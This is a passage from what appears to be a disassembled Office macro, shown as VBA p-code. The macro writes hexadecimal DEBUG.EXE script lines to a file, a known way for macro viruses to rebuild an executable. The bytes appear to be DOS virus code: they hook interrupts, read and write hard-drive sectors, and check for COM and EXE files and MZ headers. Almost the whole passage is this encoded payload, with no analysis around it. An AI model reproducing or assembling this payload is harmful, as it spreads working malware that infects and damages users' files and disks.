' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #345:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #346:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #347:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #348:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #349:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #350:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #351:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #352:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #353:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #354:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #355:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0310 00 00 00 00 00 00 00 00 00 00 00 00 FF FF 9C 83"
' 	PrintItemNL 
' Line #356:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0320 EC 04 50 1E 06 FB 2E 83 3E 1C 00 FF 74 24 C7 06"
' 	PrintItemNL 
' Line #357:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0330 06 00 F0 FE 8B EC 8C 5E 08 C7 46 06 00 01 8C DD"
' 	PrintItemNL 
' Line #358:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0340 8C C8 05 58 01 8B D8 B9 F0 0F 03 C1 8E C0 0E 1F"
' 	PrintItemNL 
' Line #359:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0350 EB 6C 8C CA 81 C2 58 01 8E DA 8B 0E 06 00 03 16"
' 	PrintItemNL 
' Line #360:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0360 08 00 8B 36 18 00 E3 0F AD 8B F8 AD 03 C2 8E C0"
' 	PrintItemNL 
' Line #361:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0370 8C C8 26 01 05 E2 F1 8B EC 8C C8 03 06 16 00 89"
' 	PrintItemNL 
' Line #362:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0380 46 08 A1 14 00 89 46 06 8C CD 03 2E 0E 00 A1 04"
' 	PrintItemNL 
' Line #363:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0390 00 8B 16 02 00 83 C2 FF 1D 00 00 B1 04 D3 EA 42"
' 	PrintItemNL 
' Line #364:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03A0 FE C1 D3 E0 03 D0 03 16 0A 00 8B CA 2B 0E 08 00"
' 	PrintItemNL 
' Line #365:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03B0 8C CB 8E DB 81 C3 58 01 03 DA 8E C3 2B D9 53 51"
' 	PrintItemNL 
' Line #366:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03C0 B8 01 02 33 DB B9 01 00 BA 80 00 CD 13 72 51 BE"
' 	PrintItemNL 
' Line #367:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03D0 51 01 33 FF B9 2B 00 FC F3 A6 74 44 BF C6 01 B9"
' 	PrintItemNL 
' Line #368:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03E0 04 00 26 83 7D 02 00 77 0C 26 83 3D 0C 77 06 26"
' 	PrintItemNL 
' Line #369:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03F0 83 3D 00 77 2B 83 C7 10 E2 E8 BE 51 01 33 FF B9"
' 	PrintItemNL 
' Line #370:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0400 2B 00 FC E8 88 01 06 1F 0E 07 B8 0B 03 B9 02 00"
' 	PrintItemNL 
' Line #371:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0410 CD 13 1E 07 0E 1F 72 08 B8 01 03 B9 01 00 CD 13"
' 	PrintItemNL 
' Line #372:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0420 59 5B 8C CA 33 FF 06 57 51 B9 1C 00 BE 35 01 FC"
' 	PrintItemNL 
' Line #373:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0430 F3 A4 59 FA CB 8B C1 8E DB 8E C2 33 F6 33 FF B9"
' 	PrintItemNL 
' Line #374:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0440 08 00 F3 A5 43 42 8B C8 E2 EB 8E D5 FB 07 1F 58"
' 	PrintItemNL 
' Line #375:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0450 CF FA 33 DB 8E DB 8E D3 BC 00 7C FB A1 13 04 2D"
' 	PrintItemNL 
' Line #376:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0460 06 00 A3 13 04 B1 06 D3 E0 8E C0 B8 0B 02 B9 02"
' 	PrintItemNL 
' Line #377:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0470 00 BA 80 00 CD 13 BB 7C 01 06 53 CB FA B8 16 02"
' 	PrintItemNL 
' Line #378:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0480 87 06 70 00 2E A3 50 15 8C C8 87 06 72 00 2E A3"
' 	PrintItemNL 
' Line #379:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0490 52 15 2E C7 06 54 15 FF FF 2E C7 06 56 15 FF FF"
' 	PrintItemNL 
' Line #380:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04A0 2E C7 06 58 15 FF FF FB 0E 07 BE 00 7C BF 51 01"
' 	PrintItemNL 
' Line #381:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04B0 B9 2B 00 FC E8 D7 00 B8 00 7C 1E 50 CB 50 56 1E"
' 	PrintItemNL 
' Line #382:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04C0 0E 1F 8B 36 5A 15 FE 0E 5C 15 F6 06 5C 15 07 75"
' 	PrintItemNL 
' Line #383:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04D0 28 46 81 FE 47 15 72 21 B0 34 E6 43 33 C0 E6 40"
' 	PrintItemNL 
' Line #384:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04E0 E6 40 8E D8 2E A1 4C 15 A3 20 00 2E A1 4E 15 A3"
' 	PrintItemNL 
' Line #385:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04F0 22 00 2E FE 06 5D 15 EB 15 89 36 5A 15 D0 04 8A"
' 	PrintItemNL 
' Line #386:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0500 24 80 E4 01 D0 E4 E4 61 24 FC 0A C4 E6 61 B0 20"
' 	PrintItemNL 
' Line #387:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0510 E6 20 1F 5E 58 CF 1E 50 53 33 C0 8E D8 A1 84 00"
' 	PrintItemNL 
' Line #388:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0520 2E 39 06 54 15 75 0A A1 86 00 2E 39 06 56 15 74"
' 	PrintItemNL 
' Line #389:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0530 17 A1 84 00 2E A3 54 15 A1 86 00 2E A3 56 15 2E"
' 	PrintItemNL 
' Line #390:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0540 C7 06 58 15 B6 00 EB 3E 2E FF 0E 58 15 75 37 2E"
' 	PrintItemNL 
' Line #391:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0550 A1 50 15 A3 70 00 2E A1 52 15 A3 72 00 B8 D4 03"
' 	PrintItemNL 
' Line #392:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0560 87 06 84 00 2E A3 54 15 8C C8 87 06 86 00 2E A3"
' 	PrintItemNL 
' Line #393:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0570 56 15 B8 10 00 BB 5E 15 2E C6 07 00 43 48 75 F8"
' 	PrintItemNL 
' Line #394:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0580 2E C6 06 47 15 FF 5B 58 1F 2E FF 2E 50 15 26 8A"
' 	PrintItemNL 
' Line #395:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0590 05 86 04 AA 46 E2 F7 C3 11 2A 03 12 2A 03 30 BF"
' 	PrintItemNL 
' Line #396:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05A0 02 3C 43 04 3D 43 04 3E AC 03 42 89 03 45 00 04"
' 	PrintItemNL 
' Line #397:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05B0 46 1C 04 4E 5A 03 4F 5A 03 5B 43 04 6C 34 04 50"
' 	PrintItemNL 
' Line #398:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05C0 51 52 1E 0E 1F 2E 80 3E 47 15 00 74 56 B4 2A E8"
' 	PrintItemNL 
' Line #399:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05D0 2B 02 39 0E 48 15 72 4B 39 16 4A 15 72 45 FA 33"
' 	PrintItemNL 
' Line #400:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05E0 C0 8E D8 B8 BD 01 87 06 20 00 2E A3 4C 15 8C C8"
' 	PrintItemNL 
' Line #401:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05F0 87 06 22 00 2E A3 4E 15 B0 34 E6 43 B0 80 E6 40"
' 	PrintItemNL 
' Line #402:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0600 B0 00 E6 40 0E 1F C6 06 5D 15 00 C6 06 5C 15 00"
' 	PrintItemNL 
' Line #403:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0610 C7 06 5A 15 47 06 FB 80 3E 5D 15 00 74 F9 C6 06"
' 	PrintItemNL 
' Line #404:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0620 47 15 00 1F 5A 59 58 E9 BE 00 E8 D0 01 3C 00 75"
' 	PrintItemNL 
' Line #405:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0630 55 9C 50 53 06 B4 2F E8 C3 01 26 80 3F FF 75 03"
' 	PrintItemNL 
' Line #406:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0640 83 C3 08 26 8A 47 16 24 1F 3C 1F 75 35 26 81 6F"
' 	PrintItemNL 
' Line #407:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0650 1C 80 15 26 83 5F 1E 00 EB 23 E8 A0 01 72 27 9C"
' 	PrintItemNL 
' Line #408:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0660 50 53 06 B4 2F E8 95 01 26 8A 47 16 24 1F 3C 1F"
' 	PrintItemNL 
' Line #409:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0670 75 10 26 81 6F 1A 80 15 26 83 5F 1C 00 26 80 77"
' 	PrintItemNL 
' Line #410:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0680 16 1F 07 5B 58 9D CA 02 00 0B DB 74 5B 53 E8 73"
' 	PrintItemNL 
' Line #411:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0690 01 5B 72 54 0A C0 75 07 81 C2 80 15 83 D1 00 E8"
' 	PrintItemNL 
' Line #412:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06A0 5B 01 72 E2 2D 80 15 83 DA 00 EB DA 0B DB 74 38"
' 	PrintItemNL 
' Line #413:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06B0 50 51 52 56 1E 0E 1F 53 E8 49 01 8B F3 5B 72 0D"
' 	PrintItemNL 
' Line #414:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06C0 C7 04 00 00 80 7C 02 00 74 03 E8 B8 01 1F 5E 5A"
' 	PrintItemNL 
' Line #415:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06D0 59 58 EB 14 53 51 BB 98 02 B9 0D 00 2E 3A 27 74"
' 	PrintItemNL 
' Line #416:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06E0 0C 83 C3 03 E2 F6 59 5B 2E FF 2E 54 15 55 8B EC"
' 	PrintItemNL 
' Line #417:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06F0 2E 8B 5F 01 87 5E 04 8B 4E 0A 87 4E 02 5D 9D C3"
' 	PrintItemNL 
' Line #418:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0700 E8 FA 00 72 48 9C 53 52 E8 F9 00 72 09 2E 8A 57"
' 	PrintItemNL 
' Line #419:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0710 02 8B D8 E8 0E 01 5A 5B 9D E9 C7 00 E8 DE 00 72"
' 	PrintItemNL 
' Line #420:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0720 2C 9C 53 51 87 D9 E8 DB 00 72 03 2E 89 0F 59 5B"
' 	PrintItemNL 
' Line #421:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0730 9D E9 AF 00 0A C0 75 B0 52 8B D6 E8 F6 00 5A 72"
' 	PrintItemNL 
' Line #422:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0740 A7 EB 05 E8 EE 00 72 A0 E8 B2 00 73 03 E9 93 00"
' 	PrintItemNL 
' Line #423:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0750 9C 50 53 51 52 1E 0E 1F 8B D8 B8 00 44 E8 9D 00"
' 	PrintItemNL 
' Line #424:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0760 72 7B F7 C2 80 00 75 75 E8 7B 00 0B C2 75 33 E8"
' 	PrintItemNL 
' Line #425:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0770 AA 00 72 69 B4 2A E8 84 00 80 C6 03 80 FE 0C 76"
' 	PrintItemNL 
' Line #426:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0780 04 41 80 EE 0C 89 0E 48 15 89 16 4A 15 B4 40 B9"
' 	PrintItemNL 
' Line #427:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0790 80 15 E8 66 00 72 3C 33 C1 75 38 B2 01 E8 84 00"
' 	PrintItemNL 
' Line #428:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07A0 EB 3B E8 46 00 E8 74 00 72 33 E8 49 00 72 24 33"
' 	PrintItemNL 
' Line #429:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07B0 C1 75 20 81 3E 00 00 4D 5A 75 18 39 06 08 00 75"
' 	PrintItemNL 
' Line #430:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07C0 12 81 3E 12 00 AD DE 75 0A B2 00 E8 56 00 BA 80"
' 	PrintItemNL 
' Line #431:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07D0 15 EB 02 33 D2 33 C9 B8 00 42 E8 20 00 1F 5A 59"
' 	PrintItemNL 
' Line #432:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07E0 5B 58 9D CA 02 00 B8 02 42 EB 03 B8 00 42 33 C9"
' 	PrintItemNL 
' Line #433:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07F0 EB 09 B4 40 EB 02 B4 3F B9 1E 00 33 D2 9C 2E FF"
' 	PrintItemNL 
' Line #434:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0800 1E 54 15 C3 50 51 8B C3 BB 5E 15 B9 08 00 2E 3B"
' 	PrintItemNL 
' Line #435:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0810 07 74 06 43 43 43 E2 F6 F9 59 58 C3 53 33 DB E8"
' 	PrintItemNL 
' Line #436:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0820 E2 FF 5B C3 53 53 33 DB E8 D9 FF 2E 8F 07 2E 88"
' 	PrintItemNL 
' Line #437:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0830 57 02 5B C3 50 51 56 57 32 E4 B9 00 01 8B F2 FC"
' 	PrintItemNL 
' Line #438:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0840 AC 0A C0 74 16 3C 5C 74 08 3C 2E 74 08 E2 F1 EB"
' 	PrintItemNL 
' Line #439:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0850 0A 32 E4 EB EB FE C4 8B FE EB E5 80 FC 01 75 1F"
' 	PrintItemNL 
' Line #440:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0860 8B F7 AD 25 DF DF 8B C8 AC 24 DF 81 F9 43 4F 75"
' 	PrintItemNL 
' Line #441:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0870 04 3C 4D 74 0B 81 F9 45 58 75 04 3C 45 74 01 F9"
' 	PrintItemNL 
' Line #442:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0880 5F 5E 59 58 C3 B8 00 42 33 C9 BA 80 15 E8 6D FF"
' 	PrintItemNL 
' Line #443:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0890 E8 63 FF 81 3E 00 00 4D 5A 74 3E C7 06 00 00 4D"
' 	PrintItemNL 
' Line #444:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08A0 5A C7 06 18 00 1C 00 C7 06 1A 00 00 00 C7 06 0E"
' 	PrintItemNL 
' Line #445:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08B0 00 48 01 C7 06 10 00 FE FF E8 2A FF 2D 80 15 83"
' 	PrintItemNL 
' Line #446:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08C0 DA 00 A3 1C 00 B9 10 00 F7 F1 83 EA 01 BA 12 10"
' 	PrintItemNL 
' Line #447:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08D0 1B D0 89 16 0A 00 EB 1E 90 C7 06 1C 00 FF FF B8"
' 	PrintItemNL 
' Line #448:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08E0 58 01 03 06 08 00 01 06 0E 00 83 06 0A 00 20 83"
' 	PrintItemNL 
' Line #449:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08F0 06 0C 00 20 73 06 C7 06 0C 00 FF FF C7 06 06 00"
' 	PrintItemNL 
' Line #450:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0900 00 00 C7 06 08 00 00 00 C7 06 12 00 AD DE C7 06"
' 	PrintItemNL 
' Line #451:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0910 16 00 00 00 C7 06 14 00 1E 00 E8 C9 FE B9 00 02"
' 	PrintItemNL 
' Line #452:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0920 F7 F1 89 16 02 00 83 C2 FF 15 00 00 A3 04 00 E8"
' 	PrintItemNL 
' Line #453:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0930 B9 FE E8 BD FE 72 0F B8 00 57 E8 C0 FE B8 01 57"
' 	PrintItemNL 
' Line #454:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0940 80 C9 1F E8 B7 FE C3 F9 DC CC 66 33 33 74 66 E3"
' 	PrintItemNL 
' Line #455:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0950 06 1C D8 F3 81 83 36 8C CC E2 E3 33 12 19 B8 62"
' 	PrintItemNL 
' Line #456:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0960 C7 83 1E 19 CC CC C1 E6 4F 1C F8 62 F1 8E C7 33"
' 	PrintItemNL 
' Line #457:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0970 18 E4 F9 B3 2C DD F1 36 47 FE 2E 08 FF 8B E3 3B"
' 	PrintItemNL 
' Line #458:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0980 C4 F1 31 C6 D0 F3 CD C1 73 9B 83 CE 2E 0E B1 B0"
' 	PrintItemNL 
' Line #459:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0990 33 CD 81 9E 36 8E 71 90 73 8C 87 38 F0 37 CD 83"
' 	PrintItemNL 
' Line #460:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09A0 BC 7C 33 C7 C3 9C 78 19 C7 81 9C 4C 31 C5 C3 1C"
' 	PrintItemNL 
' Line #461:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09B0 6E 39 E7 81 9C 78 19 C5 91 9C 6C 19 66 C9 9E 2E"
' 	PrintItemNL 
' Line #462:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09C0 0C 71 E0 E7 8D A3 3C 4C 19 E3 68 E4 E5 83 83 9A"
' 	PrintItemNL 
' Line #463:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09D0 9D 18 66 72 CE 47 C1 F1 0E E5 8C 37 C4 F1 7D 59"
' 	PrintItemNL 
' Line #464:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09E0 1B 1D C3 F0 9D 1E 44 C1 F6 39 87 63 38 EE 19 86"
' 	PrintItemNL 
' Line #465:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09F0 C4 F1 E6 18 06 18 B0 E7 33 8E 71 B2 71 CD 37 A0"
' 	PrintItemNL 
' Line #466:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A00 43 39 C6 8F B1 93 38 73 87 59 C1 9D 38 67 9C 70"
' 	PrintItemNL 
' Line #467:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A10 73 66 D9 E3 1E 4C 79 9C F1 23 47 38 E3 9B 0C 67"
' 	PrintItemNL 
' Line #468:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A20 BE 38 73 C6 69 96 61 8E 1C 71 E6 32 3C B9 C9 9C"
' 	PrintItemNL 
' Line #469:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A30 4C F8 E7 0D CC F8 64 C7 27 1C 71 C6 46 47 36 7C"
' 	PrintItemNL 
' Line #470:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A40 DB 63 87 30 3E 19 83 70 C4 1F 0E 33 E1 E1 38 6E"
' 	PrintItemNL 
' Line #471:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A50 01 CE 33 93 6E 0F 81 FC 7F 07 71 B8 1D 87 C0 EC"
' 	PrintItemNL 
' Line #472:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A60 3E 07 E3 E0 7F 1F 03 B0 F0 3F 8F 01 D8 F8 1D 8F"
' 	PrintItemNL 
' Line #473:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A70 83 B8 F8 3F 0F 83 70 F8 66 1C 86 E1 D0 EE 3D 0C"
' 	PrintItemNL 
' Line #474:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A80 C7 A1 DC 5A 19 C7 23 B8 F4 33 8B 43 38 A4 77 16"
' 	PrintItemNL 
' Line #475:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A90 86 73 68 EE 3C 8C E2 D9 CE 69 19 CC B3 1C D3 33"
' 	PrintItemNL 
' Line #476:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AA0 89 26 39 B4 C7 32 4C 73 2C C7 32 9C E6 49 8E 65"
' 	PrintItemNL 
' Line #477:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AB0 98 E6 59 8E 74 99 E6 D9 9E 6D 99 E3 41 8E 36 0E"
' 	PrintItemNL 
' Line #478:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
